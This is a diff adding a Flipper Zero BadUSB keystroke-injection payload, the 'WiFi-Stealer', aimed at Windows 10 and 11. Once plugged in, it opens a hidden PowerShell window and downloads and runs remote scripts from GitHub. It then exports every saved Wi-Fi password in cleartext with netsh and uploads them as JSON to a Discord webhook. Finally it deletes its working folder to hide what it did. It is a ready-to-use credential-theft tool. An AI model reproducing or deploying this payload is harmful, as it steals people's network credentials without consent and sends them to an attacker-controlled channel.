@@ -1,0 +1,85 @@
+REM #############################################################################################################################################################################
+REM #__________________________________________________________/\\\______________________/\\\\\\\_______________________/\\\______________________________________/\\\__        #
+REM # ________________________________________________________/\\\\\____________________/\\\/////\\\_________________/\\\\\\\_____________________________________\/\\\__       #
+REM #  ______________________________________________________/\\\/\\\______/\\\\\\\\\___/\\\____\//\\\_______________\/////\\\_____________________________________\/\\\__      #
+REM #   __/\\\____/\\\__/\\/\\\\\\____/\\____/\\___/\\______/\\\/\/\\\_____/\\\/////\\\_\/\\\_____\/\\\__/\\/\\\\\\_______\/\\\__/\\\\\\\\\\\_____/\\\\\\\\_________\/\\\__     #
+REM #    _\/\\\___\/\\\_\/\\\////\\\__\/\\\__/\\\\_/\\\____/\\\/__\/\\\____\/\\\\\\\\\\__\/\\\_____\/\\\_\/\\\////\\\______\/\\\_\///////\\\/____/\\\/////\\\___/\\\\\\\\\__    #
+REM #     _\/\\\___\/\\\_\/\\\__\//\\\_\//\\\/\\\\\/\\\___/\\\\\\\\\\\\\\\\_\/\\\//////___\/\\\_____\/\\\_\/\\\__\//\\\_____\/\\\______/\\\/_____/\\\\\\\\\\\___/\\\////\\\__   #
+REM #      _\/\\\___\/\\\_\/\\\___\/\\\__\//\\\\\/\\\\\___\///////////\\\//__\/\\\_________\//\\\____/\\\__\/\\\___\/\\\_____\/\\\____/\\\/______\//\\///////___\/\\\__\/\\\__  #
+REM #       _\//\\\\\\\\\__\/\\\___\/\\\___\//\\\\//\\\______________\/\\\____\/\\\__________\///\\\\\\\/___\/\\\___\/\\\_____\/\\\__/\\\\\\\\\\\__\//\\\\\\\\\\_\//\\\\\\\/\\_ #
+REM #        __\/////////___\///____\///_____\///__\///_______________\///_____\///_____________\///////_____\///____\///______\///__\///////////____\//////////___\///////\//__#
+REM #                                                                                                                                                                           #
+REM #  github.com/unwe4p0n1zed                                                tiktok.com/@unwe4p0n1zed                                                                          #
+REM #  twitter.com/unwe4p0n1zed                                               youtube.com/@unwe4p0n1zed                                                                         #
+REM #                                                                                                                                                                           #
+REM #  Title: WiFi-Stealer (FlipperZero)                                                                                                                                        #
+REM #  Description: This PowerShell code can steal user Wi-Fi credentials, save it as JSON file and send it over Discord channel using the provided webhook URL.                #
+REM #  Target: Windows 10, 11                                                                                                                                                   #
+REM #___________________________________________________________________________________________________________________________________________________________________________#
+REM #                                             __  __________  _      ______________ __  ________   ___  __________  ____     __                                             #
+REM #                                            / / / / __/ __/ | | /| / /  _/_  __/ // / / ___/ _ | / _ \/ __/ __/ / / / /    / /                                             #
+REM #                                           / /_/ _\ \/ _/   | |/ |/ _/ /  / / / _  / / /__/ __ |/ , _/ _// _// /_/ / /__  /_/                                              #
+REM #                                           \____/___/___/   |__/|__/___/ /_/ /_//_/  \___/_/ |_/_/|_/___/_/  \____/____/ (_)                                               #
+REM #############################################################################################################################################################################
+
+GUI R
+DELAY 1250
+STRING powershell 
+ENTER
+DELAY 1250
+STRING PowerShell.exe -WindowStyle hidden
+ENTER
+
+REM - get all the scripts needed 
+STRING Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Upload-Discord/Upload-Discord.ps1'))
+ENTER
+STRING Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Remove-FileOrFolder/Remove-FileOrFolder.ps1'))
+ENTER
+
+
+REM - set webhook url
+STRING $webhookUrl = '<SET_DISCORD_URL_HERE>'
+ENTER 
+
+STRING $dir = -join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_})
+ENTER
+
+STRING New-Item -Path $env:temp -Name $dir -ItemType "directory"
+ENTER
+
+STRING $fullPath = "$env:temp/$dir"
+ENTER 
+
+STRING Set-Location -Path $fullPath
+ENTER
+
+STRING netsh wlan export profile key=clear
+ENTER
+
+STRING $files = Get-ChildItem ./ -recurse
+ENTER
+
+STRING $data = foreach ($file in $files) { [xml]$xml = Get-Content -Path $file.Name; $xml.WLANProfile.SSIDConfig.SSID | Select-Object -Property name, @{Name="password";Expression={$xml.WLANProfile.MSM.security.sharedKey.keyMaterial}}, @{Name="bssid";Expression={$xml.WLANProfile.SSIDConfig.SSID.hex}}} 
+ENTER
+
+STRING $username = (Get-ChildItem Env:\USERNAME).Value
+ENTER
+
+STRING $jsonFileName = "WiFi-Credentials-$username.json"
+ENTER
+
+STRING $data | ConvertTo-Json | Out-File $jsonFileName
+ENTER 
+
+REM - send discord message and files
+STRING & Upload-Discord -t "WiFi Credentials - $username" -f $jsonFileName -u $webhookUrl
+ENTER 
+
+STRING Set-Location ../
+ENTER 
+
+STRING Remove-FileOrFolder -ip $fullPath -it "Folder" 
+ENTER
+
+STRING EXIT
+ENTER
